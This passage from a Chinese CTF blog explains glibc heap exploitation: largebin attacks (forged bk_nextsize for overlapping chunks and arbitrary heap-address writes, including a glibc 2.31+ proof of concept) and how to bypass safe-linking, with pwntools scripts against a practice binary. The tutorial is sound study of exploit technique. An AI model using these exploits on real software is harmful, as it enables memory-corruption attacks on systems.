class="comment">//第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//进入这里时，已经确定链表第一个节点——即最大的chunk大于要申请的size，那么我们就应该从这一条链中取，问题就是取这一条链上的哪一个？</span></span><br><span class="line">              victim = victim-&gt;bk_nextsize; <span class="comment">//本来victim是链中最大的那个，现在我们要从小往遍历，那么victim-&gt;bk_nextsize就循环回了链中最小的那个</span></span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb))) <span class="comment">//第二步，从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line">                victim = victim-&gt;bk_nextsize;<span class="comment">//victim取相邻的更大size的chunk</span></span><br><span class="line"> </span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) <span class="comment">//第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span></span><br><span class="line">                victim = victim-&gt;fd;            <span class="comment">//出现相同大小时堆头作为次优先申请</span></span><br><span class="line"> </span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//第四步，largebin unlink 操作</span></span><br><span class="line"> </span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE) <span class="comment">//第五步，如果剩余的空间小于MINSIZE，则将该空间直接给用户</span></span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb); <span class="comment">//第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中（切割后）。</span></span><br><span class="line"> </span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);<span class="comment">//bck是ub头</span></span><br><span class="line">                  fwd = bck-&gt;fd;                         <span class="comment">//fwd是ub第一个chunk</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                <span class="comment">//以上操作完成后lastremainder被插入ub，成为新的链首元素</span></span><br><span class="line">                <span class="comment">//如果不在smallbin范围，那么nextsize指针置空</span></span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以总结为以下流程:</p><p>1.首先读取largebin中最大chunk的大小 与用户申请的大小对比 如果小于则另寻办法申请chunk 如果大于就进入下一步</p><p>2.根据bk_nextsize来索引最小的chunk 顺着fd_nextsize来寻找与申请大小最为接近的chunk</p><p>3.如果查找到了合适的free chunk 先判断其是否只有单一chunk位于链表头 如果链表中有其他chunk的话 则分配其他chunk 这样是为了节省重新分配fd_nextsize和bk_nextsize的麻烦</p><p>4.判断分配完了的free chunk 如果剩余的大小大于MINSIZE 那么就放入到unsortedbin中 如果剩余大小小于MINSIZE 则一并分配给用户</p><h4 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h4><p>首先是我自己的第一个疑问 如何申请到单位不是MINSIZE的chunk 先来尝试一下手动修改size值 看看会不会按照预期效果分配chunk</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303082002468.png" title="image-20230308200227435" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303082002468.png" alt="image-20230308200227435"></a></p><p>将这一个chunk的size域从0x461修改为0x466 按照源代码的逻辑 此时申请一个0x410大小的chunk 剩下被分配到unsortedbin的chunk大小应该为0x40</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303082004737.png" title="image-20230308200449709" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303082004737.png" alt="image-20230308200449709"></a></p><p>失败了 看来是无法单单通过修改size域来实现预期效果 </p><p>到这里转念一想 64位构成一个chunk最起码也要0x20字节 毕竟还需要size域和prev_size域 也就是说如果此时largebin中有一个0x460的free chunk 我们申请一个0x450的chunk 显然会剩下0x10字节 小于MINSIZE 那么按照逻辑 就应该一起给了用户申请的chunk</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303082017932.png" title="image-20230308201736899" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303082017932.png" alt="image-20230308201736899"></a></p><p>可以看到确实是这样</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h4 id="修改bk-nextsize来造成overlap"><a href="#修改bk-nextsize来造成overlap" class="headerlink" title="修改bk_nextsize来造成overlap"></a>修改bk_nextsize来造成overlap</h4><p>漏洞的原理在于将chunk从largebin中取出的时候 其是从最小的chunk开始索引 以此找到适合的free chunk用来分配</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">             (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb)) <span class="comment">//判断链表的第一个结点，即最大的chunk是否大于要申请的size</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize; </span><br><span class="line">             <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="type">unsigned</span> <span class="type">long</span>) (nb))) </span><br><span class="line">               victim = victim-&gt;bk_nextsize;  <span class="comment">//漏洞点，伪造bk_nextsize</span></span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) </span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd); </span><br><span class="line"> </span><br><span class="line">     ... </span><br><span class="line">     <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure><p>关键点在于victim &#x3D; victim-&gt;bk_nextsize这一句 如果我们修改了victim的bk_nextsize域 再构造一个fake chunk 就可以申请到fake chunk</p><p>通常这一做法被用来构造overlap chunk 接下来详细分析一下</p><p><strong>环境: libc2.23</strong></p><p><strong>漏洞目的:实现overlap chunk</strong></p><p><strong>漏洞需求:拥有向largebin中释放堆块的能力 能够泄露出堆地址</strong> <strong>拥有堆溢出</strong></p><p><strong>演示二进制程序:由笔者自己编写 基本所有漏洞都有</strong></p><p>首先我们需要先泄露libc基址 在没有UAF的前提下 我们可以通过申请两个chunk 将其释放到fastbin中 此时后释放的chunk位于链表头 其fd指向先释放的chunk 由于malloc函数在申请chunk的后并不会对chunk的内容进行清空 所以我们可以再次申请同样大小的chunk 将链表头的chunk申请出来 随后打印出chunk的内容 也就是泄露基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x31</span></span><br><span class="line">success(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3    把还在fastbin中的chunk1申请回来 理论上应该不影响 但是在之前chunk extend的时候有影响 所以还是申请出来为妙</span></span><br></pre></td></tr></table></figure><p>我们一共需要两个chunk 下面我们分别称这些chunk为chunkA B</p><p>chunkA是要放入到largebin中的 并且其要为largebin中最大的chunk 这样修改chunkA的bk_nextsize域才能索引到fake chunk</p><p>chunkB则是用来构造fake chunk的</p><p>在学习unlink的时候 当时的unlink可以做到任意地址申请 因为最后chunk的ptr和fd、bk域有关</p><p>largebin的unlink则是用来申请一个正在使用的chunk 从而导致overlap 为此我们只需要绕过一个判断即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们需要使得 fake chunk的fd域或者是bk域指向的地址 以此地址为chunk首地址 其bk域和fd域相应的存放fake chunk的首地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303101356658.png" title="image-20230310135640568" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303101356658.png" alt="image-20230310135640568"></a></p><p>此时的chunkB的内部构造应该是这个样子 这里之所以在fake_nextsize域后还要再加上fakechunk的首地址 就是为了绕过unlink检查</p><p>这里的fakechunk首地址放到哪里都行 只需要修改fd或者bk域  就比如图中的情况来说 我们需要保证这个值+0x20以后的地址存放着fakechunk的首地址 也就是我们需要填入chunkB+0x28 由于unlink的判断只需要满足一个就行 所以图中的构造其实是多余的</p><p>还需要注意的是nextsize域需要设置为0 因为如果nextsize域有值 plmalloc就会去申请下一个堆块 而非链表头的堆</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602200</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x31</span></span><br><span class="line">success(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x470</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x480</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">chunkB_addr = heap_addr +<span class="number">0x4f0</span></span><br><span class="line">success(<span class="string">&quot;chunkB_addr :&quot;</span>+<span class="built_in">hex</span>(chunkB_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x481</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(chunkB_addr+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(<span class="number">0x491</span>)</span><br><span class="line">payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x481</span>)+p64(chunkB_addr+<span class="number">0x40</span>-<span class="number">0x18</span>)+p64(chunkB_addr+<span class="number">0x40</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(chunkB_addr+<span class="number">0x10</span>)*<span class="number">2</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x480</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># payload = p64(chunkB_addr+0x10)*2</span></span><br><span class="line"><span class="comment"># bss_write(bss_addr,payload)</span></span><br><span class="line">add(<span class="number">0x470</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>代码中注释的部分是bss段上构造双向链表 不过感觉正常的题不会给这个机会 也就我自己编写的题会给一个bss_write函数了</p><h4 id="修改bk域和bk-nextsize域实现任意地址写堆地址"><a href="#修改bk域和bk-nextsize域实现任意地址写堆地址" class="headerlink" title="修改bk域和bk_nextsize域实现任意地址写堆地址"></a>修改bk域和bk_nextsize域实现任意地址写堆地址</h4><p>这种利用手法的意义在于 fastbin对于申请出来的chunk的大小和对应链表有检测 如果利用这个的话 就可以绕过这个检测</p><p>利用的关键在于源码中的这两处地方</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;  <span class="comment">#1</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  </span><br><span class="line"></span><br><span class="line">fwd-&gt;bk = victim;  <span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>第一句 此时的victim指向的是要放入largebin的chunk 其bk_nextsize域的值由fwd的bk_nextsize域决定 </p><p>而victim的bk_nextsize指向的地址的fd_nextsize域会存入victim的地址 所以如果我们修改fwd的bk_nextsize域 就可以做到堆地址写</p><p>第二句  fwd的bk域指向的地址会存入victim的地址 这里同样可以利用</p><p>所以我们只需要修改已经位于largebin中的一个chunk的bk域和bk_nextsize域 同时释放一个size大于其的chunk进入largebin 就可以利用漏洞</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602200</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(bss_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>之所以chunk3的大小要同为可以被释放进largebin 是因为防止过小从chunk0中分配 导致chunk0被放入到unsortedbin 调大chunk0的值同样可行</p><p>chunk4的目的在于将chunk2放入到largebin</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303102301110.png" title="image-20230310230144021" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303102301110.png" alt="image-20230310230144021"></a></p><p>此时的bss_addr内容如图所示 以0x602200为首地址 两字长后为bk域 是<strong>fwd-&gt;bk &#x3D; victim</strong>的效果 也就是如果我们修改fwd的bk域 那么任意写的地址在于ptr_addr + 0x10</p><p>bk_nextsize的值则是<strong>victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim</strong>的效果 也就是我们修改fwd的bk_nextsize域 任意写的地址在于ptr_addr + 0x20</p><p>largebin的利用在高版本中还是比较常见的 许多house of系列就是基于largebin的 需要好好掌握</p><h3 id="2-31以上漏洞利用"><a href="#2-31以上漏洞利用" class="headerlink" title="2.31以上漏洞利用"></a>2.31以上漏洞利用</h3><p>2.31对于largebin的检查做了一些增强 虽然还是能够largebinattack 往任意地址写堆地址 但是攻击效果没有那么强大了</p><p>新版本针对largebin 新增了两个检查 导致我们原本的方法行不通了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd)) malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd) malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是还是有办法 原本我们利用的是比largebin中大的chunk放入largebin 引起的那些操作<br>与之相对的 还有小chunk放入largebin中的操作 不过只能往一个地址写入堆地址 相比之攻击效果不够强大 所以一开始没有使用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就是我们要利用的代码 直接跟着我来源码调试吧  这样就清楚了</p><p>我写的POC：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;make by chen&quot;</span>);</span><br><span class="line">  <span class="type">char</span> test_array[<span class="number">0x20</span>];</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x460</span>); <span class="comment">//largebin</span></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//to separate</span></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x450</span>); <span class="comment">//unsortedbin</span></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x450</span>); <span class="comment">//to separate</span></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x470</span>); <span class="comment">//Release p1 into largebin</span></span><br><span class="line">  <span class="built_in">free</span>(p2);  <span class="comment">//Release p2 into unsortedbin</span></span><br><span class="line">  *(p1+<span class="number">3</span>) = test_array<span class="number">-0x20</span>;</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x470</span>); <span class="comment">//Release p2 into largebin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241311645.png" title="image-20230324131150506" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241311645.png" alt="image-20230324131150506"></a></p><p>申请四个chunk chunk1和4用来防止合并 接着释放chunk0 随后申请一个大chunk 把chunk0放入到largebin中 并且把chunk2也放入到unsortedbin中</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241314475.png" title="image-20230324131435420" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241314475.png" alt="image-20230324131435420"></a></p><p>接着我们需要伪造chunk0的bk_nextsize 将其修改为ptr_addr-0x20 然后把chunk2释放到largebin中 </p><p>s进入malloc函数 接着n到int_malloc函数 再次s进入</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241317496.png" title="image-20230324131722457" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241317496.png" alt="image-20230324131722457"></a></p><p>断点打在这三行源代码所在的行数 我所用的源码是3846 然后c到这里即可</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241321052.png" title="image-20230324132115009" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241321052.png" alt="image-20230324132115009"></a></p><p>此时的victim-&gt;fd_nextsize即chunk2的fd_nextsize域  fwd-&gt;fd指向chunk0</p><p>执行完这步后 chunk2的fd_nextsize域写入chunk0的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241349144.png" title="image-20230324134935047" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241349144.png" alt="image-20230324134935047"></a></p><p>下一句相当于 chunk2的bk_nextsize域写入chunk0的bk_nextsize域内容</p><p>接下来一句就是我们任意写的关键了</p><p>往chunk0的bk_nextsize域 以及chunk2的bk_nextsize的fd_nextsize域写入chunk2地址 但是前一句 已经修改了chunk2的bk_nextsize域为chunk0的bk_nextsize域 所以此时是往我们修改的Ptr_addr+0x20写入chunk2地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241356736.png" title="image-20230324135628692" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241356736.png" alt="image-20230324135628692"></a><br>总结一下 就是修改largebinchunk的bk_nextsize为ptr_addr-0x20 就可以往ptr_addr写入unsortedchunk的地址</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>safe-linking</title>
      <link href="/2023/03/03/safe-linking/"/>
      <url>/2023/03/03/safe-linking/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>低版本中 无论是tcachebin还是fastbin 只要我们修改fd域就可以将对应地址放置到链表上 威胁程度非常高</p><p>在libc2.32以后 saft-linking机制诞生 一定程度上缓解了这种现象的出现</p><p>其通过在chunk被释放到链表之前对fd域进行加密 取出后解密来实现堆块的存入和取出 并且有效遏制了用户在没有密匙的情况下篡改fd域从而实现任意地址申请的chunk</p><p>不过这个加密的手段比较简单 所以我们仍然有办法绕过这个机制 只需要获取其密匙就行了</p><h2 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>pos是指针本身的地址 ptr是指针的值</p><p>加密的公式翻译成中文形式也就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(fd指针地址算术右移12位)异或(指针的值)</span><br></pre></td></tr></table></figure><p>如果我们想要按照以前一样任意地址取出chunk 就需要在修改fd域的时候就按照这个加密办法</p><p>这也就意味着我们需要获取到堆的地址 这样才能伪造fd域</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>你可能会想到申请两个chunk 释放进bin中 随后泄露其fd域 获取堆地址</p><p>这样当然可行 不过由于这个机制  我们泄露fd域的方法会更加简单 如果单纯释放一个chunk到tcache链表中</p><p>换做往常 其fd域值为0</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041154059.png" title="image-20230304115401970" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041154059.png" alt="image-20230304115401970"></a></p><p>但是受到机制的影响 在2.32版本以后 此时的fd域应该是 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(0x55b170682260&gt;&gt;12) ^ 0</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041158164.png" title="image-20230304115848121" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041158164.png" alt="image-20230304115848121"></a></p><p>你会发现最后的结果也就是去除了后三位  这就意味着如果我们释放一个chunk到tcachebin中 再泄露出fd域 得到的值算术左移12位 就可以得到堆基址  因为堆基址是从当前页起始 也就是后三位固定为0 并且只申请一个chunk的话 大小总不会超过0x1000吧 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041203581.png" title="image-20230304120306555" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041203581.png" alt="image-20230304120306555"></a></p><p>于是 如果我们想要通过tcachebin获取任意地址的堆块 只需要将对应地址异或(堆基址&gt;&gt;12) 前提是你没有申请超过0x1000大小的chunk 致使对应的chunk到了下一页</p><h2 id="真题分析"><a href="#真题分析" class="headerlink" title="真题分析"></a>真题分析</h2><h3 id="Hgame2023-week3-safenote"><a href="#Hgame2023-week3-safenote" class="headerlink" title="Hgame2023-week3-safenote"></a>Hgame2023-week3-safenote</h3><p><strong>题目环境2.32 做题环境ubuntu18 libc2.27</strong></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041206333.png" title="image-20230304120644302" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041206333.png" alt="image-20230304120644302"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一共给了四个函数</span><br><span class="line">add函数 可以申请0xff大小以下的chunk</span><br><span class="line">delete函数 释放chunk后并没有置零指针 存在UAF</span><br><span class="line">edit函数 没有办法堆溢出</span><br><span class="line">show函数 调用puts函数输出堆块内容</span><br></pre></td></tr></table></figure><p>非常常规的一道题 无非就是利用UAF实现libc基址的泄露 并且利用tcache打hook</p><p>但是因为版本在libc2.32 所以有几个地方需要注意</p><p>由于最大只能申请0xff大小的chunk 并且没有办法chunk extend 所以这里采用填满tcache链表的办法使得chunk被释放到unsortedbin中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span 